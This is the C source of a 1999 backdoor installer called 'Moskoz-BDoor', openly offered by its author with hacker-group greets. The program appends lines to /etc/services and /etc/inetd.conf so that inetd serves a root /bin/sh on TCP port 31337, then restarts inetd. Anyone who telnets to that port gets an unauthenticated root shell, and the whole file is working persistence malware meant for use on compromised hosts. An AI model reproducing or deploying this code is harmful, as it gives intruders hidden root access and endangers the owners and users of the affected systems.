//  Moskoz-BDoor v1.0 by DaCure  <-* Moskoz Sex Hackers 1999 *->
//
//  Creates a bacdoor at the specified port. 
//
//  To compile: cc mbdoor.c -o mbdoor     
//  
//  Usage: ./mbdoor
//
//  After you run the program, now you can telnet to the r00ted host to
//  the port you specified. The default port is 31337.
//
//  Greets: AcidGum, Yo_Soy, SatMex, xDAWN, AloneX, Yiedld19, DeadSector
//          and everyone else at #raza-mexicana.            


//  The default port is 31337, change this number if you want

#define SERV_STRING    "moskoz  31337/tcp" 
#define INETD_STRING  "moskoz stream tcp nowait root /bin/sh /bin/sh -i"

#include <stdio.h>
#include <string.h>

void main(int argc, char **argv){
        
        FILE *fp;


        printf("Moskoz-BDoor v1.0  v1.0 by DaCure  <-* Moskoz Sex Hackers
1999 *->\n");
        printf("Installing...\n"); 

        fp = fopen("/etc/services", "a");

        fputs("\n", fp);
        fputs(SERV_STRING, fp);
        fclose(fp);

        printf("- Service %s installed.", SERV_STRING);

        fp = fopen("/etc/inetd.conf", "a");
        
        fputs("\n", fp);      
        fputs(INETD_STRING, fp);
        fclose(fp);

        printf("- Inetd Service %s installed.\n", INETD_STRING);

        system("killall -HUP inetd");

        printf("- HUP singal sent to the inet daemon.\n");

        printf("done!\n\n");
        printf("Now you can telnet to the default port and get a root
shell. -Have a nice hack ;-)\n\n");

}


